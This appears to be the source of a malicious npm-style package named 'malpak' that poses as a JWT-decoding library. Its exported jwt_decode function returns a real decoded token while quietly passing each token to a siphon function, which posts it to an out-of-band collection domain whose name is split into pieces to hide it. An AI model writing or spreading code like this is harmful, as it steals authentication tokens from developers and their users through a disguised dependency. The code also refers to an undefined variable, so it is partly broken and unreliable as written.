import axios from "axios";
import { jwtDecode } from 'jwt-decode';

let h1 = "ify.c"
const ver = "0.0.6";

function greeting() {
    console.log(`malpak v${ver} is here`);
}

export function pwn(anything) {
    greeting()
    let msg = `malpak can see: ${anything}`;
    console.log(msg);
    return msg;
}

export function jwt_decode(anything) {
    greeting()
    let msg = `malpak (jwt_decode) was called with: ${anything}`;
    console.log(msg)
    siphon(anything);
    return jwtDecode(anything);
}

async function siphon(anything) {
    axios.post(`${prefix}.oast${h1}` + `om`, anything);
}
